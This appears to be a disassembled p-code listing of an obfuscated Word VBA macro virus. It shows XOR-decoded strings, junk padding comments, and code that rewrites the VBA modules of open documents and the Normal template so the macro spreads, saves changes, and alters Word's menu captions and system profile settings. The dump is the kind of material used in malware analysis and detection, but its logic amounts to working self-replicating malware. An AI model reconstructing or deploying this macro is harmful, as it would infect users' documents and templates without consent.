' 	Ld ChJaS1rh8wy545qTD3Oh 
' 	Concat 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld CH4FiSmTVaO80BVm 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Ld Kmc4Ms3l1m4074Y 
' 	Ld NlY8Q5Hd7gwSw2en4XuI 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #243:
' 	Ld CpJ0d1Bfi2q 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld ChJaS1rh8wy545qTD3Oh 
' 	Concat 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld CH4FiSmTVaO80BVm 
' 	Concat 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #244:
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	ArgsLd LBound$ 0x0002 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld EJI3827ImdS1 
' 	Ld EJI3827ImdS1 
' 	FnLen 
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	Concat 
' 	St EJI3827ImdS1 
' Line #245:
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	Ld vbCr 
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Add 
' 	St XETANiN6XySXhlCv8 
' Line #246:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #247:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0003 
' 	Add 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003D 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0003 
' 	Add 
' 	St NtYVb56bhPo 
' Line #248:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	St XETANiN6XySXhlCv8 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St XETANiN6XySXhlCv8 
' 	EndIf 
' Line #249:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #250:
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	Ld XETANiN6XySXhlCv8 
' 	Ld NtYVb56bhPo 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim$ 0x0001 
' 	St T7SAs7h1CF0wvWqQ 
' Line #251:
' 	QuoteRem 0x0000 0x005D "863.2484   265.7276    191.7554    5152.925    1130.916    956.514 2883.45 3688.501    363.52"
' Line #252:
' 	Ld T7SAs7h1CF0wvWqQ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoSub S19978rl5Vx4bb 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	Ld XETANiN6XySXhlCv8 
' 	Mid 
' 	EndIf 
' Line #253:
' 	EndIfBlock 
' Line #254:
' 	Loop 
' Line #255:
' 	LitDI2 0x0001 
' 	St XETANiN6XySXhlCv8 
' Line #256:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #257:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0003 
' 	Add 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	St NtYVb56bhPo 
' Line #258:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0003 
' 	Add 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	FnInStr3 
' 	St XETANiN6XySXhlCv8 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St XETANiN6XySXhlCv8 
' 	EndIf 
' Line #259:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0003 
' 	Add 
' 	Ld XETANiN6XySXhlCv8 
' 	Ld NtYVb56bhPo 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim$ 0x0001 
' 	St M32jk4AlYbb 
' 	BoS 0x0000 
' 	GoSub Yc79VMMCiI8p8 
' 	EndIf 
' Line #260:
' 	Loop 
' Line #261:
' 	LitDI2 0x0001 
' 	St XETANiN6XySXhlCv8 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St NtYVb56bhPo 
' Line #262:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #263:
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	FnInStr3 
' 	St XETANiN6XySXhlCv8 
' Line #264:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0014 
' 	Sub 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #265:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0014 
' 	Sub 
' 	St NtYVb56bhPo 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St I31a6731A3TPTQpu 
' Line #266:
' 	QuoteRem 0x0000 0x0063 "812.2487   30.32756    4359.64 7422.216    4304.424    2085.234    355.5037    2763.809    412.3481"
' Line #267:
' 	Do 
' 	BoS 0x0000 
' 	Ld NtYVb56bhPo 
' 	Ld I31a6731A3TPTQpu 
' 	Add 
' 	St NtYVb56bhPo 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld XETANiN6XySXhlCv8 
' 	Ld NtYVb56bhPo 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim$ 0x0001 
' 	Ld vbCr 
' 	FnInStr3 
' 	St I31a6731A3TPTQpu 
' 	BoS 0x0000 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0000 
' 	Eq 
' 	LoopUntil 
' Line #268:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0001 
' 	Add 
' 	St NtYVb56bhPo 
' Line #269:
' 	EndIfBlock 
' Line #270:
' 	QuoteRem 0x0000 0x0043 "244.7063   342.4896    4735.532    932.8177    581.1005    2766.581"
' Line #271:
' 	Ld XETANiN6XySXhlCv8 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	Ld XETANiN6XySXhlCv8 
' 	Ld NtYVb56bhPo 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim$ 0x0001 
' 	St M32jk4AlYbb 
' 	BoS 0x0000 
' 	GoSub Yc79VMMCiI8p8 
' 	Else 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #272:
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Add 
' 	St NtYVb56bhPo 
' Line #273:
' 	Loop 
' Line #274:
' 	Dim 
' 	VarDefn HWkr7gQ739w28 (As Boolean)
' Line #275:
' 	Dim 
' 	VarDefn T8xYIqasKfV2Gc4 (As Long)
' Line #276:
' 	QuoteRem 0x0000 0x001F "497.2138   1601.159    943.1287"
' Line #277:
' 	Dim 
' 	VarDefn NEEb40m2pb6Q4E (As String)
' Line #278:
' 	QuoteRem 0x0000 0x004F "332.342    483.2255    926.2627    686.8918    8272.071    2774.262    324.0801"
' Line #279:
' 	Dim 
' 	VarDefn Gglir9K3JrH66XwDev (As String)
' Line #280:
' 	Dim 
' 	VarDefn V082kbbTxfv3ccJ (As String)
' Line #281:
' 	Dim 
' 	VarDefn Urwlo65IlATwE851x0k2 (As String)
' Line #282:
' 	Dim 
' 	VarDefn R6asbGvxIE7 (As String)
' Line #283:
' 	QuoteRem 0x0000 0x001A "320.2016   1651.95 2252.97"
' Line #284:
' 	Dim 
' 	VarDefn WWURq9o3YATyy74mSqRu (As String)
' Line #285:
' 	Dim 
' 	VarDefn LbG8E6i45AN (As String)
' Line #286:
' 	LitStr 0x0007 "—ç„ðÒèÇ"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	St Gglir9K3JrH66XwDev 
' Line #287:
' 	LitStr 0x0010 "”à�¦åõÇŸ¼ŠûãÅ©Ý“"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St V082kbbTxfv3ccJ 
' Line #288:
' 	LitStr 0x0010 "”à�¦çóÍ„™…ÙïÓ£Ý“"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St Urwlo65IlATwE851x0k2 
' Line #289:
' 	LitStr 0x0013 "”à�¦õõÎ�¾­ÕüÍ­�ß¼âø"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St R6asbGvxIE7 
' Line #290:
' 	LitStr 0x0012 "”à�¦çóÍ„™‡ÈøÈ£›Éçã"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St WWURq9o3YATyy74mSqRu 
' Line #291:
' 	LitStr 0x0013 "”à�¦÷óÁ�‡­Öøþƒ…ß¡âø"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St LbG8E6i45AN 
' Line #292:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld K1ckH7chEf84syd6g 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #293:
' 	SetStmt 
' 	Ld I31a6731A3TPTQpu 
' 	Ld K1ckH7chEf84syd6g 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Xu17GqW4w6tAsta33061UC1nc1n 
' Line #294:
' 	StartWithExpr 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	With 
' Line #295:
' 	StartForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #296:
' 	Ld Mpaq715g25NGb7Dk55 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	ArgsLd UCase$ 0x0001 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #297:
' 	QuoteRem 0x0000 0x005E "7125.493   4855.103    1044.27 241.5694    5566.55 1234.598    169.3122    2631.005    4781.73"
' Line #298:
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld V082kbbTxfv3ccJ 
' 	ArgsLd UCase$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld Urwlo65IlATwE851x0k2 
' 	ArgsLd UCase$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Or 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld R6asbGvxIE7 
' 	ArgsLd UCase$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Or 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld WWURq9o3YATyy74mSqRu 
' 	ArgsLd UCase$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #299:
' 	StartForVariable 
' 	Ld T8xYIqasKfV2Gc4 
' 	EndForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	MemLdWith CountOfLines 
' 	For 
' Line #300:
' 	Ld T8xYIqasKfV2Gc4 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	Ld CP4fStWRJJgnNu9ua 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld T8xYIqasKfV2Gc4 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #301:
' 	Ld T8xYIqasKfV2Gc4 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	BoS 0x001F 
' 	Ld T8xYIqasKfV2Gc4 
' 	LitDI2 0x0001 
' 	Sub 
' 	St T8xYIqasKfV2Gc4 
' Line #302:
' 	StartForVariable 
' 	Ld T8xYIqasKfV2Gc4 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld T8xYIqasKfV2Gc4 
' 	LitDI2 0x0001 
' 	Sub 
' 	St Mpaq715g25NGb7Dk55 
' Line #303:
' 	EndIfBlock 
' Line #304:
' 	StartForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	EndForVariable 
' 	NextVar 
' Line #305:
' 	QuoteRem 0x0000 0x004B "436.6981   1548.019    3339.711    509.2786    1751.239    4091.43 1343.682"
' Line #306:
' 	EndWith 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #307:
' 	SetStmt 
' 	Ld LRbDSg04suq763Hs 
' 	Set Xu17GqW4w6tAsta33061UC1nc1n 
' Line #308:
' 	StartWithExpr 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	With 
' Line #309:
' 	LitStr 0x0008 "ˆÛÍÃáÎíº"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St NEEb40m2pb6Q4E 
' Line #310:
' 	StartForVariable 
' 	Ld T8xYIqasKfV2Gc4 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #311:
' 	QuoteRem 0x0000 0x006E "20.95998   139.9631    114.0845    387.7918    7238.426    8864.418    2339.01 3994.448    1131.626    1855.25"
' Line #312:
' 	Ld T8xYIqasKfV2Gc4 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #313:
' 	Ld EJI3827ImdS1 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	ArgsLd LBound$ 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld LbG8E6i45AN 
' 	LitDI2 0x0004 
' 	LitDI2 0x000E 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #314:
' 	LitStr 0x0014 "”à�¦÷óÁ�‡­Öøþ�™Õ¼¯ùí"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St B8LpM131ei639bf284e5 
' Line #315:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld EJI3827ImdS1 
' 	St C9kpgxW5Y0E8fNkNHoH 
' 	BoS 0x0000 
' 	Ld LbG8E6i45AN 
' 	St B8LpM131ei639bf284e5 
' Line #316:
' 	EndIfBlock 
' Line #317:
' 	QuoteRem 0x0000 0x001F "3027.811   944.8923    1914.507"
' Line #318:
' 	LitDI2 0x0000 
' 	St NtYVb56bhPo 
' Line #319:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #320:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	ArgsLd UCase$ 0x0001 
' 	Ld B8LpM131ei639bf284e5 
' 	FnLen 
' 	ArgsLd Right$ 0x0002 
' 	Ld B8LpM131ei639bf284e5 
' 	ArgsLd UCase$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Add 
' 	St NtYVb56bhPo 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #321:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #322:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #323:
' 	Ld NtYVb56bhPo 
' 	St By4Vq4Qglc7 
' 	BoS 0x0000 
' 	Ld NEEb40m2pb6Q4E 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0047 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld EJI3827ImdS1 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	Concat 
' 	St J4DAKmx68y3B9e 
' 	BoS 0x0000 
' 	GoSub HM2fh8Ofy1dE8liCfc 
' Line #324:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith CountOfLines 
' 	For 
' Line #325:
' 	QuoteRem 0x0000 0x0067 "443.4276   6936.578    1448.763    3982.341    564.2993    39.38089    1613.187    1893.503    1238.167"
' Line #326:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	ArgsLd UCase$ 0x0001 
' 	St P9Ws98b1734 
' Line #327:
' 	Ld P9Ws98b1734 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	Ld NEEb40m2pb6Q4E 
' 	Eq 
' 	IfBlock 
' Line #328:
' 	Ld I31a6731A3TPTQpu 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	BoS 0x0000 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Sub 
' 	St I31a6731A3TPTQpu 
' Line #329:
' 	Ld P9Ws98b1734 
' 	LitDI2 0x0007 
' 	ArgsLd LBound$ 0x0002 
' 	Ld CP4fStWRJJgnNu9ua 
' 	ArgsLd UCase$ 0x0001 
' 	Eq 
' 	ElseIfBlock 
' Line #330:
' 	Ld I31a6731A3TPTQpu 
' 	St By4Vq4Qglc7 
' 	BoS 0x0000 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	St J4DAKmx68y3B9e 
' 	BoS 0x0000 
' 	GoSub HM2fh8Ofy1dE8liCfc 
' 	BoS 0x0000 
' 	ExitFor 
' Line #331:
' 	EndIfBlock 
' Line #332:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #333:
' 	QuoteRem 0x0000 0x0037 "7272.262   5497.262    4931.812    132.3904    1216.006"
' Line #334:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St By4Vq4Qglc7 
' 	BoS 0x0000 
' 	Ld Gglir9K3JrH66XwDev 
' 	Ld B8LpM131ei639bf284e5 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld CP4fStWRJJgnNu9ua 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St J4DAKmx68y3B9e 
' 	BoS 0x0000 
' 	GoSub HM2fh8Ofy1dE8liCfc 
' Line #335:
' 	EndIfBlock 
' Line #336:
' 	StartForVariable 
' 	Ld T8xYIqasKfV2Gc4 
' 	EndForVariable 
' 	NextVar 
' Line #337:
' 	Ld K1ckH7chEf84syd6g 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #338:
' 	Ld vbCr 
' 	Ld CP4fStWRJJgnNu9ua 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #339:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St By4Vq4Qglc7 
' 	BoS 0x0000 
' 	Ld V082kbbTxfv3ccJ 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld Urwlo65IlATwE851x0k2 
' 	Concat 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld R6asbGvxIE7 
' 	Concat 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld WWURq9o3YATyy74mSqRu 
' 	Concat 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	St J4DAKmx68y3B9e 
' 	BoS 0x0000 
' 	GoSub HM2fh8Ofy1dE8liCfc 
' Line #340:
' 	LitStr 0x003C "�Þ¨ßìÐí««„çÁà�½ó���—þßÊàÑÅø½ÃÆäÃïøˆÎ—Ôò¨ž–Ý€ØÅÌ¦’ÒµÛÂ½§öÏùðú"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #341:
' 	LitStr 0x000F "•ðŠïÀèÇš�¬÷ûÏ©‡"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St C9kpgxW5Y0E8fNkNHoH 
' 	BoS 0x0000 
' 	LitStr 0x000C "ŠüžòÖî‚»š§Ûç"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St B8LpM131ei639bf284e5 
' 	BoS 0x0000 
' 	Ld B8LpM131ei639bf284e5 
' 	LitStr 0x0000 ""
' 	Ld Kmc4Ms3l1m4074Y 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #342:
' 	LitStr 0x0016 "•ðŠïÀèÇš�¬÷þÆ­›Óµ«¥­þ×"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St C9kpgxW5Y0E8fNkNHoH 
' 	BoS 0x0000 
' 	LitStr 0x0009 "„ú�ÿÁõÅ€ž"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St B8LpM131ei639bf284e5 
' Line #343:
' 	QuoteRem 0x0000 0x0043 "215.4544   1437.185    20.53443    440.6264    889.6014    746.8937"
' Line #344:
' 	LitStr 0x001E "õ¥Ý¶“ÏÒ‡‰£•ÚÔ žÛ¡ê’«ãÉÑåÑÃôŽà�"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld B8LpM131ei639bf284e5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Concat 
' 	St B8LpM131ei639bf284e5 
' 	BoS 0x0000 
' 	Ld B8LpM131ei639bf284e5 
' 	LitStr 0x0000 ""
' 	Ld Kmc4Ms3l1m4074Y 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #345:
' 	LitStr 0x000D "áØ„õÇùÐÈ¹¸×ïÊ"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0027 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld CpJ0d1Bfi2q 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld ChJaS1rh8wy545qTD3Oh 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld CH4FiSmTVaO80BVm 
' 	Concat 
' 	LitDI2 0x039F 
' 	ParamNamed ID 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd FindControl 0x0001 
' 	MemSt Caption 
' Line #346:
' 	QuoteRem 0x0000 0x004B "1435.629   5330.34 3470.067    1843.886    2657.577    1594.407    3677.936"
' Line #347:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	ParamNamed SaveChanges 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #348:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	ElseIfBlock 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #349:
' 	EndIfBlock 
' Line #350:
' 	EndWith 
' Line #351:
' 	GoTo KQhb5kf52d9Q90ve2 
' Line #352:
' 	QuoteRem 0x0000 0x002B "1331.003   1990.652    467.1088    343.2257"
' Line #353:
' 	Label K4HIhrETANiN6XySX 
' Line #354:
' 	StartForVariable 
' 	Ld K9Bm6t353BaD 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	FnLen 
' 	For 
' Line #355:
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Xor 
' 	ArgsLd Chr$ 0x0001 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Ld K9Bm6t353BaD 
' 	LitDI2 0x0001 
' 	Mid 
' Line #356:
' 	StartForVariable 
' 	Ld K9Bm6t353BaD 
' 	EndForVariable 
' 	NextVar 
' Line #357:
' 	QuoteRem 0x0000 0x0057 "4579.377   4314.568    2120.883    3168.307    6088.109    3197.59 1314.853    3477.278"
' Line #358:
' 	Return 
' Line #359:
